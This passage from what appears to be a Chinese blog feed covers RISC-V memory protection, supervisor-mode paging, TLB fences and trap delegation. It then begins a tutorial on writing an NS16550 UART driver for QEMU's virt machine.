允许机器模式指定用户模式下可以访问的内存地址。PMP entry 由一个 8-bit 的 PMP 配置寄存器和一个 32/64 位长的 PMP 地址寄存器组成。整个 PMP 包括若干个（通常为 8 到 16 组）PMP entry 。配置寄存器可以配置读、写和执行权限，地址寄存器用来划定界限。</p><p>下两图显示了 PMP 地址寄存器和配置寄存器的布局。pmpxxcfg 表示了 PMP 配置寄存器，pmpxxaddr 表示了 PMP 地址寄存器。</p><p><img src="/img/pmpcfg.png" alt=""></p><p><img src="/img/pmpaddr.png" alt=""></p><p>当处于用户模式的处理器尝试 load 或 store 操作时，将地址和所有的 PMP 地址寄存器比较。如果地<br>址大于等于 PMP 地址 i，但小于 PMP 地址 i+1，则 PMP i+1 的配置寄存器决定该访问是否可以继续，如果不能将会引发访问异常。</p><p>R，W，X 位分别指示了 PMP 入口允许读、写、执行权限。A 域解释了 PMP 寄存器的编码情况。</p><p><img src="/img/pmpcfg_mode.png" alt=""></p><center><img src="/img/pmpcfg_A.png" /></center><h2 id="监管者模式">监管者模式</h2><p>前文所述，<code>mstatus</code> 、<code>mie</code> 、<code>mip</code> 、<code>mtvec</code> 等寄存器在监管者模式 (Supervisor mode) 下都有与之名字几乎一样的、功能也相似的寄存器，方便了我们举一反三，这就体现出 RISC-V 体系结构的优越性了。在这里先挖个坑，有时间我会专门介绍一下 RISC-V 体系结构的优越性。</p><p>相比于机器模式的最高权限和强制手段，监管者模式没有这么高的权限。一般来说，监管者模式就是为对标现代操作系统而生的。监管者模式通常存在于复杂的 RISC-V 系统上，其核心功能就是支持内存分页、内存保护、中断/异常处理等。当然，监管者模式还是有些地方与机器模式不同，接下来我会重点介绍。</p><h3 id="SATP-寄存器">SATP 寄存器</h3><p>顾名思义，satp (Supervisor Address Translation and Protection Register) 寄存器的作用是在监管者模式下，控制地址转换与保护的。寄存器内位分布如下图：</p><center><img src="/img/satp.png" /><div>注：PPN: Physical Page Number of the root page table.<br>ASID: Address Space Identifier<br></div></center><p>ASID (地址空间标识符) 域是可选的，它用于帮助地址空间的转换，降低上下文切换的开销。PPN 存储了根页表的物理页号，以 4 KiB 页面大小为单位，它在内存分页中起了十分重要的作用。MODE 位用于选择地址转换的方式，详见 <code>SFENCE.VMA</code> 指令。</p><p>MODE 位的功能见下表：</p><span id="mode" /><center><img src="/img/satp_mode.png" /></center>### 内存分页<p>在稍微复杂的 RISC-V 处理器中，仅仅依靠 PMP 模块来提供内存保护是不够的。因为 PMP 不够灵活：仅支持固定数量的内存区域；很多复杂的应用程序要求在物理存储中连续，会产生存储碎片；PMP 又无法有效支持分页。</p><p>因此，设计人员在监管者模式中又发明了基于页面的虚拟内存机制（分页机制），可以说，分页机制是操作系统的核心问题了，对于分页机制，详细介绍请见<a href="https://www.jianshu.com/p/3558942fe14f">分页机制</a>，这里做简单说明，RISC-V 中监管者模式提供了一种传统的虚拟内存系统，它将内存划分为<strong>固定大小的页</strong>，以此为基础进行地址转换，并提供对内存内容的保护。启用分页的时候，监管者模式和用户模式下的地址（包括 load 和 store 的有效地址和 PC 中的地址）都是<strong>虚拟地址</strong>，要访问物理内存,它们必须被转换为真正的<strong>物理地址</strong>。</p><p>参照 <a href="#mode"><code>satp</code> 寄存器的MODE 功能表</a>，在 MODE = bare 时，没有分页机制，此时虚拟地址就等于物理地址，此时也就没有额外的内存保护功能了。RV32 只支持 Sv32 分页模式，RV64 支持 Sv39、Sv48、<em>Sv57、Sv64</em> 分页，粗略看一下 <a href="https://riscv.org/specifications/privileged-isa/">RISC-V privileged ISA Specification</a>，RV64 居然已经在为四级分页作准备了！</p><p>当 satp 启动分页时，在监管者模式或用户模式下，虚拟地址 (VA) 会将 satp 寄存器中根页表地址作为基址 (base)，以及自身的页号作偏移 (VPN[1])，在页表中通过计算偏移位置 (base + VPN[1] * 4) 找到<strong>页表项 (Page Table Entry PTE)</strong>。如果该 PTE 不是叶 PTE（什么是页 PTE 下面会解释），那么再将刚刚找到的 PTE 作为基址，用虚拟地址携带的第二个页号作偏移，继续算出第二个页表项，直到获得物理地址 (PA)，更加详细的虚拟地址转换过程见<a href="#VA">附录</a>。</p><span id="VA2PA" /><center><img src="/img/VA2PA.png" /></center><p>再来看看虚拟地址和物理地址的二进制格式。我们以 Sv32 分页模式为例，虚拟地址、物理地址的编码都是将页号放在 MSB 处，而将偏移量放在 LSB 处。Sv32 分页支持两级分页。从偏移量位长可以看出，Sv32 页表含有 1024 个 PTEs，每个页表项占 4 字节，总共 4 KiB 。</p><center><img src="/img/VA_PA.png" /></center><p>最后看一下页表项。<strong>V</strong>alid 位指示该 PTE 是否有效；<strong>R</strong>eadable，<strong>W</strong>riteable，e<strong>X</strong>ecutable 指示了该页是否可读、可写、可运行，当这三位都是 0 时，表明该 PTE 指向了下一层页表，其为<strong>非叶 PTE</strong> ，否则就是<strong>叶 PTE</strong>；<strong>U</strong>ser 位指示了该页是否可以被用户模式访问；<strong>G</strong>lobal 指示了全局映射，存在于所有的地址空间中；<strong>A</strong>ccess 位指示了该页最近是否被读、写、取；<strong>D</strong>irty 位指示了虚拟页最近是否被写过。对于非叶 PTE，<strong>D</strong>，<strong>A</strong>，<strong>U</strong> 位被保留，并被清零。RSW 是保留的，用于操作系统软件。</p><span id="RWX" /><center>    <img src="/img/pte.png" />    <img src="/img/pte_field.png" /></center>---<p><strong>分页</strong>指的就是用<u>地址管理器或者地址翻译器</u>（下统称 MMU）将系统中的物理地址转换/翻译为虚拟地址。我们已经详细地介绍了<a href="#VA2PA">翻译过程</a>，该过程使用 <code>satp</code> 寄存器对虚拟地址进行一系列的访问计算，得到物理地址。接下来，我们讨论一下页表与<strong>页错误 (page fault)</strong>。</p><p>考虑在 Sv32 分页模式下，一个页表最多需要 <code>1024 * 4 bytes = 4 KiB</code> ，而二级分页需要 1024 个页表，此外页表的页表（页目录）也需要 4 KiB，因此，整个页表就需要 4 MiB 大小。而在 Sv39 等三级分页甚至四级分页中，页表需要的空间会更多，因此毫无疑问的，页表不能存在于一级 Cache 中。我们可以将页表放在内存中的任何位置，并以 4 KiB 对齐。</p><p>RISC-V 设计分页机制时充分了解并吸取了早期体系结构的设计教训。<a href="https://wiki.osdev.org/Paging">x86-64 分页</a>中上层页表控制了下层页表，如果上层页表是只读的，那么被该页表控制的下层页表就不能被写入了，这可不是什么聪明的做法。而 x86-64 可以做到<a href="https://www.sandpile.org/x86/paging.htm">粗粒度控制与细粒度控制的转换</a>，却是一个巧妙的做法。 RISC-V 设计人员引入了叶 PTE 与非叶 PTE 的概念，并使用 <a href="#RWX">R W X 这三个位域来定义</a>，从而将<u>页表的层级 (level) 和它是指向页表还是仅包含物理地址区分</u>开来，使得每个层级的 PTE 都可以是叶 PTE，既实现了粗细粒度控制，又可以防止上层页表控制下层页表。例如，在 Sv39 中，若第二级页表就是叶 PTE，那么就会形成一个大小为 2 M 的<strong>超级页</strong>，相比于 4 KB 更粗粒度。</p><p>MMU 会在以下几种情况下发出页错误信号：</p><ul><li>在取指令时，发现指令所在的页没有运行权限 X，或者该页无效 V，此时异常代码为 12 。</li><li>取数据时，发现数据所在的页没有读权限 R，或在该页无效 V，此时异常代码为 13 。</li><li>存储数据时，发现数据所在的页没有写权限 W，或在该页无效 V，此时异常代码为 15 。</li></ul><p>在多数操作系统中，他们认为的正确应对方式是杀掉出现问题的进程（解决提出问题的人🐶），但如果使用了 <code>copy-on-write</code> 技术，那么这可能是个 feature（不是 bug 是个 feature 🐶）。</p><h3 id="SFENCE-VMA-与同步"><code>SFENCE.VMA</code> 与同步</h3><p>在内存分页中，我们看到为了从虚拟地址得到一个物理地址，我们经过了相当复杂的计算过程。考虑到页表都是存放在内存或者高级 Cache 里，多次访问页表会导致访问性能大大降低。从本科的操作系统课程中可以了解到，解决这一问题的通常作法是引入 TLB（Translation Lookaside Buffer 地址转换缓存），而这又会到来页表相不一致的问题。在 RISC-V 中，解决方法就是增加一条指令，用于刷新 TLB，进行显式同步。</p><p>该指令叫内存管理栅栏指令 (fence instruction) <code>SFENCE.VMA</code> 。它的作用是<strong>同步</strong>。该指令更新在内存中的“内存管理数据结构”（嗨，其实就是页表），确保在这条指令之前的存储操作都是有序的。该指令也可以用于刷新一些与地址转换相关的局部 cache（就是 TLB）。</p><p>该指令需要两个可选的参数 <code>rs1</code> 和 <code>rs2</code> ，这样可以缩小缓存刷新的范围。<code>rs1</code> 针对页表，指示了页表哪个虚址对应的转换被修改了；<code>rs2</code> 给出了被修改页表的进程的地址空间标识符 (ASID)。如果两者都是 <code>x0</code>，便会刷新整个 TLB。</p><p>说了这么多，我们到底要在什么场合用到它呢？<a href="https://riscv.org/specifications/privileged-isa/">RISC-V privileged ISA Specification</a> 给出了如下五个场景，这里仅做简单介绍。</p><ul><li>当一个软件要回收再利用一个 ASID（与另一个页表关联）</li><li>若具体实现没有提供 ASID，或者软件选择 ASID = 0，那么 <code>satp</code> 寄存器每次被写入后，就应当使用 <code>SFENCE.VMA with rs1=x0</code> 指令。</li><li>若软件修改了非叶 PTE ，应该执行 <code>SFENCE.VMA with rs1=x0</code> 。</li><li>若软件修改了叶 PTE，应该执行 <code>SFENCE.VMA with rs1=VA within the page</code> 。</li><li>特殊情况如给叶 PTE 增加权限、将无效 PTE 变为有效等，软件可能会选择执行 <code>SFENCE.VMA</code> 。</li></ul><h3 id="中断与异常委托">中断与异常委托</h3><p>一般情况下，在系统发生异常时，控制权都会被移交到<strong>机器模式</strong>下的 trap 处理程序中。然而，Unix 等系统的大多数 trap 处理程序都<strong>应该在监管者模式下</strong>运行。一个简单的解决方案是，让机器模式下的处理程序指向监管者模式的处理程序。但这样的坏处显而易见：速度过慢，明明可以一步到位地转向监管者模式，非要绕道机器模式然后再到监管者模式。因此，RISC-V 提供了一种委托机制，将一些中断/异常处理程序委托给监管者模式。</p><p>CSR 寄存器 <code>mideleg</code> (Machine Interrupt Delegation，机器中断委托) 指示哪些<strong>中断</strong>将委托给监管者模式。与 <code>mip</code> 和 <code>mie</code> 一样，被委托的中断位域位置与该中断在 <a href="#mcause">mcause 寄存器的事件编码图</a>的代码号一致。</p><p>例如，<code>mideleg[5]</code> 对应于监管者模式的时钟中断，如果把它为 1 ，即 <code>li a0, 1 &lt;&lt; 5 ; csrw mideleg a0</code>， 监管者模式的时钟中断将由该模式下的异常处理程序，而不是机器模式的异常处理程序处理。当然，委托意味着对中断的一种负责，因此委托给监管者模式的任何中断都会受到监管者模式下 CSR 寄存器（主要是 <code>sie</code>、<code>sip</code> ）的控制，而没有被委托的中断对应位是无效的。</p><p>相应地，<code>medeleg</code> 寄存器处理的是<strong>同步异常</strong>委托，其用法与 <code>mideleg</code> 寄存器相通，被委托的异常位域位置与该异常在 <a href="#mcause">mcause 寄存器的事件编码图</a>的代码号一致。例如，当 <code>medeleg[15]</code> 设置为 1 时，那么 store 过程中的页错误 (page fault) 就会委托给监管者模式。</p><p>在 hart 运行的权限级别低于或等于被委托的级别时，此时若 bit <code>i</code> 在 <code>mideleg</code> 置位，且 <code>mstatus.SIE</code> 或 <code>mstatus.UIE</code> 中断有效时，中断会被认为是全局有效的。</p><hr><p>可能有人会问，那么，委托这种情况只会发生在监管者模式下么？<strong>当然不会</strong>。如果这个系统支持在用户模式下处理 trap ，那么监管者模式的 <code>sedeleg</code> 和 <code>sideleg</code> 寄存器就会开始委托机制：若产生的 trap 可以被委托给用户模式，那么该 trap 会转移给用户模式下的处理程序，而不是监管者模式下的处理程序。</p><blockquote><p>If U-mode traps are supported, S-mode may in turn set corresponding bits in the sedeleg and sideleg registers to delegate traps that occur in U-mode to the U-mode trap handler.</p></blockquote><hr><p>中断委托的具体过程如何？</p><ul><li>某个 trap 被委托给了模式 <code>x</code>，并且在执行过程中触发</li><li><code>xcause</code> 寄存器更新，写入 trap 的起因</li><li><code>xepc</code> 寄存器更新，写入 trap 发生时指令的地址（虚拟地址）</li><li><code>xtval</code> 寄存器更新，写入 trap 对应的处理程序位置</li><li><code>mstatus.xPP</code> 写入在发生 trap 时的特权级别</li><li><code>mstatus.xPIE</code> 写入 <code>xIE</code> 的值，而 <code>xIE</code> 的值被清除</li><li><strong>注意：<code>mcause</code> 和 <code>mepc</code> 以及 MPP MPIE 域不会更新</strong></li></ul><p>trap 永远不会从特权较高的模式过渡到特权较低的模式。例如，如果机器模式下，非法指令异常已经被委托给监管者模式，而此时在机器模式下，软件执行了一条非法指令，则 trap 将采用机器模式的处理程序，而不是委派给监管者模式。然而，还是上面的例子，如果监管者模式下，软件遇到了非法指令异常，trap 由监管者模式的异常处理程序处理。</p><hr><p>有些异常无法被权限较低的模式处理，此时相应的委托寄存器的位域就必须接地。</p><blockquote><p>Some exceptions cannot occur at less privileged modes, and corresponding x edeleg bits should be hardwired to zero. In particular, medeleg[11] and sedeleg[11:9] are all hardwired to zero.</p></blockquote><span id="VA" /><h2 id="附录">附录</h2><p>为了给以后的工作打下坚实的基础，这里详细翻译一下 <a href="https://riscv.org/specifications/privileged-isa/">RISC-V privileged ISA Specification</a> 中 4.3.2 节，关于虚拟地址的翻译/转换过程：</p><ol><li>定义 <code>a</code> = satp.<em>ppn</em> × PAGESIZE ，且定义 <code>i</code> = LEVELS − 1 。</li><li>定义 <code>pte</code> 指向地址为 <code>a</code> +va.<em>vpn</em>[<code>i</code>]×PTESIZE 的 PTE 的指针，并访问。若访问 <code>pte</code> 违反了 PMP (Physical Memory Protection) 或 PMA (Physical Memory Attributes) ，相应的访问异常会产生。</li><li>如果 <code>pte.v = 0</code>, or <code>pte.r = 0</code> and <code>pte.w = 1</code>，停止并产生相应的页错误。</li><li>否则，PTE 有效，若 <code>pte.r = 1</code> or <code>pte.x = 1</code> 跳转到第 5 步。否则，该 PTE 就是指向另一个页表的 PTE，令 <code>i</code> = <code>i</code> -1 。若 <code>i &lt; 0</code> ，停止并产生页错误。否则，令 <code>a</code> = pte.<em>ppn</em> × PAGESIZE ，跳转到第 2 步。</li><li>叶 PTE 找到了，根据 <code>pte.r</code> 、<code>pte.w</code>、<code>pte.x</code>、<code>pte.u</code> 位的值，确定它是否有权限，若没有，那么停止并产生相应的页错误。</li><li>若 <code>i &gt; 0</code> 且 <code>pte.pnn[i-1:0] != 0</code> ，这是一个非对齐的超级页；停止并产生相应的页错误。</li><li>若 <code>pte.a = 0</code> ，或者内存访问为 store 且 <code>pte.d = 0</code> ，要么产生页错误，要么<ul><li>置 <code>pte.a = 1</code> ，如果内存访问为 store ，那么也置 <code>pte.d = 1</code></li><li>若访问违反了 PMA 或 PMP 检查，产生相应的错误。</li><li>该更新以及第 2 步的访问必须是原子的。</li></ul></li><li>此时转换成功，生成物理地址：<ul><li>pa.pgoff = va.pgoff</li><li>若 <code>i &gt; 0</code> ，那么就是超级页的转换，此时 `pa.ppn[i-1:0] = va.vpn[i-1:0]</li><li>pa.ppn[LEVELS-1:i] = pte.ppn[LEVELS-1:i]</li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>RISC-V</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RISC-V</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RISC-V from Scratch 4</title>
    <link href="/2020/08/01/2020-8-1-riscv-from-scratch-4/"/>
    <url>/2020/08/01/2020-8-1-riscv-from-scratch-4/</url>
    
    <content type="html"><![CDATA[<h1>RISC-V from scratch 4: 写 UART 驱动</h1><p>接上一篇<a href="https://dingfen.github.io/risc-v/2020/07/27/riscv-from-scratch-3.html">博客</a>，我今天继续写 <em>RISC-V from scratch</em> 系列博客。我原本打算将该系列全部翻译成中文，但原作者貌似没有把这一系列完成就咕咕了，<strong>因此本文的内容是我自己实践的内容，以及一些自己的想法，放在这里同大家探讨，算是狗尾续貂，弥补遗憾</strong>。</p><h2 id="简介">简介</h2><p>欢迎再次来到 <em>RISC-V from scratch</em> ，先快速回顾一下我们之前做过的内容，我们之前已经探索了很多与 RISC-V 及其生态相关的底层概念（例如编译、链接、原语运行时、汇编等）。具体来说，在上一篇文章中，我们初步认识了 <strong>UART</strong>，并从 <code>riscv64-virt.dts</code> 中找到了关于 UART 的基本信息，我们还在链接器脚本里添加了 UART 的基本地址，且已经搭建了一个驱动程序框架。</p><p>在我实际动手操作的过程中，发现使用 RISC-V 汇编写 UART 驱动程序是吃力不讨好的行为，因此，我使用 C 语言完成了驱动的编写，这就是本篇博客的主要内容。如果大家想要看一下原博主的内容，那么就请参考 <a href="https://twilco.github.io/riscv-from-scratch/2019/07/28/riscv-from-scratch-4.html">RISC-V from scratch 4: Creating a function prologue for our UART driver (2 / 3)</a> 。</p><h2 id="搭建环境"><a href="https://dingfen.github.io/2020/07/24/riscv-from-scratch-1.html#qemu-and-risc-v-toolchain-setup">搭建环境</a></h2><p>如果你还未看本系列博客的第一部分，没有安装 <code>riscv-qemu</code> 和 RISC-V 工具链，那么赶紧点击上面标题的链接，跳转到 <a href="https://twilco.github.io/riscv-from-scratch/2019/03/10/riscv-from-scratch-1.html#qemu-and-risc-v-toolchain-setup">“QEMU and RISC-V toolchain setup”</a> 。</p><p>之后，再将博主创建的 github 库下载下来，作为我们的工作点。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone git@github.com:twilco/riscv-from-scratch.git<br><span class="hljs-meta prompt_"># </span><span class="language-bash">or `git <span class="hljs-built_in">clone</span> https://github.com/twilco/riscv-from-scratch.git` to <span class="hljs-built_in">clone</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">via HTTPS rather than SSH</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">alternatively, <span class="hljs-keyword">if</span> you are a GitHub user, you can fork this repo.</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">https://help.github.com/en/articles/fork-a-repo</span><br>cd riscv-from-scratch/work<br></code></pre></td></tr></table></figure><p>译注：亲测无需下载 github 库也可实现下面的实验。</p><h2 id="UART-回顾">UART 回顾</h2><p>本博客的目的是在 <code>virt</code> 机器上，使用 UART 在屏幕打印出字符。为了使这一工作顺利，我们先来回顾一下 UART 在 <code>virt</code> 机器上的布局。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">uart@10000000 &#123;<br>        interrupts = &lt;0x0a&gt;;<br>        interrupt-parent = &lt;0x02&gt;;<br>        clock-frequency = &lt;0x384000&gt;;<br>        reg = &lt;0x00 0x10000000 0x00 0x100&gt;;<br>        compatible = &quot;ns16550a&quot;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>参考之前的<a href="https://dingfen.github.io/risc-v/2020/07/27/riscv-from-scratch-3.html">博客</a>，我们已经了解到 UART 是用于传输、接收系列数据的硬件设备，根据上面所列的数据，UART 的时钟频率是3.6864 MHz，UART 在内存的位置起始于 <code>0x10000000</code> ，长度为 <code>0x100</code> 字节，我们在链接器脚本中定义了全局符号 <code>__uart_base_add</code> 。UART 与 NS16550a 编程模型兼容。</p><h2 id="UART-细节">UART 细节</h2><p>完整的了解该硬件是写驱动程序的前提。我细读了 <a href="https://www.lammertbies.nl/comm/info/serial-uart">Serial UART information</a> 和 <a href="http://www.byterunner.com/16550.html">TECHNICAL DATA ON 16550</a>，算是大致清楚了 UART 结构的数据存储传递情况 <code>: )</code>。</p><p>考虑到文章的篇幅，以及读者的耐心等原因，我在这里简单的扯两句，想要完整的了解 UART ，啃英文技术文档是必不可少的。</p><p>在 UART 中，可访问的 I/O 端口一共有8个，他们的功能作用列于下表，<code>base address</code> 指的就是 UART 的起始内存位置，而 <code>DLAB</code> 位于 <code>LCR</code> 寄存器，是一个用于转换功能的转换位。</p><table><caption>UART register to port conversion table</caption><tbody><tr><th>&nbsp;</th><th colspan="2">DLAB = 0</th><th colspan="2">DLAB = 1</th></tr><tr><th>I/O port</th><th>Read</th><th>Write</th><th>Read</th><th>Write</th></tr><tr class="odd" align="center"><td>base</td><td><b>RHR</b><br />receiver<br />buffer</td><td><b>THR</b><br />transmitter<br />holding</td><td colspan="2"><b>DLL</b> divisor latch LSB</td></tr><tr class="even" align="center"><td>base + 1</td><td><b>IER</b><br />interrupt<br />enable</td><td><b>IER</b><br />interrupt<br />enable</td><td colspan="2"><b>DLM</b> divisor latch MSB</td></tr><tr class="odd" align="center"><td width="20%">base + 2</td><td width="20%"><b>IIR</b><br />interrupt<br />identification</td><td width="20%"><b>FCR</b><br />FIFO<br />control</td><td width="20%"><b>IIR</b><br />interrupt<br />identification</td><td width="20%"><b>FCR</b><br />FIFO<br />control</td></tr><tr class="even" align="center"><td>base + 3</td><td colspan="4"><b>LCR</b> line control</td></tr><tr class="odd" align="center"><td>base + 4</td><td colspan="4"><b>MCR</b> modem control</td></tr><tr class="even" align="center"><td>base + 5</td><td><b>LSR</b><br />line<br />status</td><td>–<br />factory<br />test</td><td><b>LSR</b><br />line<br />status</td><td>–<br />factory<br />test</td></tr><tr class="odd" align="center"><td>base + 6</td><td><b>MSR</b><br />modem<br />status</td><td>–<br />not<br />used</td><td><b>MSR</b><br />modem<br />status</td><td>–<br />not<br />used</td></tr><tr class="even" align="center"><td>base + 7</td><td colspan="4"><b>SCR</b> scratch</td></tr></tbody></table><p>上表简单罗列了一下各个寄存器的位置、名称、相关功能等，基于这些内容，我们就已经可以明白很多了：</p><ul><li><p>访问寄存器的方法非常简单，将之前定义的 <code>__uart_base_addr</code> 加上偏移量，就是各个寄存器的地址了</p></li><li><p>我们的任务是在屏幕上打印出字符，显然不能将 <code>DLAB</code> 设置为1，DLAB = 1 时，RHR IER 寄存器就被用来设置通信速率了。具体描述见下：</p><blockquote><p><strong>DLL</strong> (Divisor Latch LSB Register) contains the lower 8-bit value that the MCU divides into the MCU clock (PCLK) to generate the UART baud rate.</p><p><strong>DLM</strong> (Divisor Latch MSB Register) contains the upper 8-bit value that the MCU divides into the MCU clock (PCLK) to generate the UART baud rate.</p></blockquote></li><li><p>IER 寄存器是中断使能寄存器，到现在为止，我似乎还未解答读者的一个疑问，就是 UART 为什么需要中断。这里我稍加解释一下：在计算机运行起来时，需要处理很多驱动、系统调用等程序，若没有中断，那么 CPU 只能非常卑微地、每时每刻地“询问各个寄存器的变化情况”，以及时作出响应，若每个驱动都这么干，CPU 不得累死。有了中断，UART 就可以自己发送信号给 CPU ，通知它来处理事件。</p></li></ul><p>虽然我们已经清楚了各个寄存器的地址以及它们的作用，但事实上具体如何控制我们仍旧不清楚，为此，我们必须参考更加详细的文档。</p><hr><table border="0" cellspacing="1" cellpadding="5" align="center"><tr bgcolor="#666666"><td align="center" valign="middle"><font color="white"><b>A2</b></font></td><td align="center" valign="middle" bgcolor="#006699"><font color="white"><b>A1</b></font></td><td align="center" valign="middle"><font color="white"><b>A0</b></font></td><td align="center" valign="middle" bgcolor="#006699"><font color="white"><b>REG.</b></font></td><td align="center" valign="middle"><font color="white"><b>BIT 7</b></font></td><td align="center" valign="middle" bgcolor="#006699"><font color="white"><b>BIT 6</b></font></td><td align="center" valign="middle"><font color="white"><b>BIT 5</b></font></td><td align="center" valign="middle" bgcolor="#006699"><font color="white"><b>BIT 4</b></font></td><td align="center" valign="middle"><font color="white"><b>BIT 3</b></font></td><td align="center" valign="middle" bgcolor="#006699"><font color="white"><b>BIT 2</b></font></td><td align="center" valign="middle"><font color="white"><b>BIT 1</b></font></td><td align="center" valign="middle" bgcolor="#006699"><font color="white"><b>BIT 0</b></font></td></tr><tr bgcolor="#f5f5f5"><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">0</font></td><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">RHR</font></td><td align="center" valign="middle">bit 7</td><td align="center" valign="middle"><font color="#006699">bit 6</font></td><td align="center" valign="middle">bit 5</td><td align="center" valign="middle"><font color="#006699">bit 4</font></td><td align="center" valign="middle">bit 3</td><td align="center" valign="middle"><font color="#006699">bit 2</font></td><td align="center" valign="middle">bit 1</td><td align="center" valign="middle"><font color="#006699">bit 0</font></td></tr><tr><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">0</font></td><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">THR</font></td><td align="center" valign="middle">bit 7</td><td align="center" valign="middle"><font color="#006699">bit 6</font></td><td align="center" valign="middle">bit 5</td><td align="center" valign="middle"><font color="#006699">bit 4</font></td><td align="center" valign="middle">bit 3</td><td align="center" valign="middle"><font color="#006699">bit 2</font></td><td align="center" valign="middle">bit 1</td><td align="center" valign="middle"><font color="#006699">bit 0</font></td></tr><tr bgcolor="#f5f5f5"><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">0</font></td><td align="center" valign="middle">1</td><td align="center" valign="middle"><font color="#006699">IER</font></td><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">0</font></td><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">0</font></td><td align="left" valign="middle">modem status interrupt</td><td align="left" valign="middle"><font color="#006699">receive line status interrupt</font></td><td align="left" valign="middle">transmit holding register interrupt</td><td align="left" valign="middle"><font color="#006699">receive holding register interrupt</font></td></tr><tr><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">1</font></td><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">FCR</font></td><td align="left" valign="middle">RCVR trigger MSB</td><td align="left" valign="middle"><font color="#006699">RCVR trigger LSB</font></td><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">0</font></td><td align="left" valign="middle">DMA mode select</td><td align="left" valign="middle"><font color="#006699">transmit FIFO reset</font></td><td align="left" valign="middle">receiver FIFO reset</td><td align="left" valign="middle"><font color="#006699">FIFO enable</font></td></tr><tr bgcolor="#f5f5f5"><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">1</font></td><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">ISR</font></td><td align="left" valign="middle">0/FIFO enabled</td><td align="left" valign="middle"><font color="#006699">0/FIFO enabled</font></td><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">0</font></td><td align="left" valign="middle">interrupt prior. bit 2</td><td align="left" valign="middle"><font color="#006699">interrupt prior. bit 1</font></td><td align="left" valign="middle">interrupt prior. bit 0</td><td align="left" valign="middle"><font color="#006699">interrupt status</font></td></tr><tr><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">1</font></td><td align="center" valign="middle">1</td><td align="center" valign="middle"><font color="#006699">LCR</font></td><td align="left" valign="middle">divisor latch enable</td><td align="left" valign="middle"><font color="#006699">set break</font></td><td align="left" valign="middle">set parity</td><td align="left" valign="middle"><font color="#006699">even parity</font></td><td align="left" valign="middle">parity enable</td><td align="left" valign="middle"><font color="#006699">stop bits</font></td><td align="left" valign="middle">word length bit 1</td><td align="left" valign="middle"><font color="#006699">word length bit 0</font></td></tr><tr bgcolor="#f5f5f5"><td align="center" valign="middle">1</td><td align="center" valign="middle"><font color="#006699">0</font></td><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">MCR</font></td><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">0</font></td><td align="center" valign="middle">0</td><td align="left" valign="middle"><font color="#006699">loop back</font></td><td align="center" valign="middle">OP2</td><td align="center" valign="middle"><font color="#006699">OP1</font></td><td align="center" valign="middle">RTS</td><td align="left" valign="middle"><font color="#006699">DTR</font></td></tr><tr><td align="center" valign="middle">1</td><td align="center" valign="middle"><font color="#006699">0</font></td><td align="center" valign="middle">1</td><td align="center" valign="middle"><font color="#006699">LSR</font></td><td align="left" valign="middle">0/FIFO error</td><td align="left" valign="middle"><font color="#006699">transmit empty</font></td><td align="left" valign="middle">transmit holding empty</td><td align="left" valign="middle"><font color="#006699">break interrupt</font></td><td align="left" valign="middle">framing error</td><td align="left" valign="middle"><font color="#006699">parity error</font></td><td align="left" valign="middle">overrun error</td><td align="left" valign="middle"><font color="#006699">receive data ready</font></td></tr><tr bgcolor="#f5f5f5"><td align="center" valign="middle">1</td><td align="center" valign="middle"><font color="#006699">1</font></td><td align="center" valign="middle">0</td><td align="center" valign="middle"><font color="#006699">MSR</font></td><td align="center" valign="middle">CD</td><td align="center" valign="middle"><font color="#006699">RI</font></td><td align="center" valign="middle">DSR</td><td align="center" valign="middle"><font color="#006699">CTS</font></td><td align="center" valign="middle">delta CD</td><td align="center" valign="middle"><font color="#006699">delta RI</font></td><td align="center" valign="middle">delta DSR</td><td align="center" valign="middle"><font color="#006699">delta CTS</font></td></tr><tr><td align="center" valign="middle">1</td><td align="center" valign="middle"><font color="#006699">1</font></td><td align="center" valign="middle">1</td><td align="center" valign="middle"><font color="#006699">SPR</font></td><td align="center" valign="middle">bit 7</td><td align="center" valign="middle"><font color="#006699">bit 6</font></td><td align="center" valign="middle">bit 5</td><td align="center" valign="middle"><font color="#006699">bit 4</font></td><td align="center" valign="middle">bit 3</td><td align="center" valign="middle"><font color="#006699">bit 2</font></td><td align="center" valign="middle">bit 1</td><td align="center" valign="middle"><font color="#006699">bit 0</font></td></tr></table><span id="tip">为了完成接下来的工作，有几点必须**注意**：</span><ul><li><p>RHR (Receiver Holding Register) 与 THR (Transmitter Holding Register) 事实上共用一个地址，在 UART 读模式时，地址0被解读为 RHR 寄存器，它将 RHR 中的数据读入。在写模式时，被解读为 THR 寄存器，将数据传输到目标地。</p></li><li><p>LCR 寄存器的 0，1 bit 位，规定了字长，相当于在说一次能传几位数据。ASCII 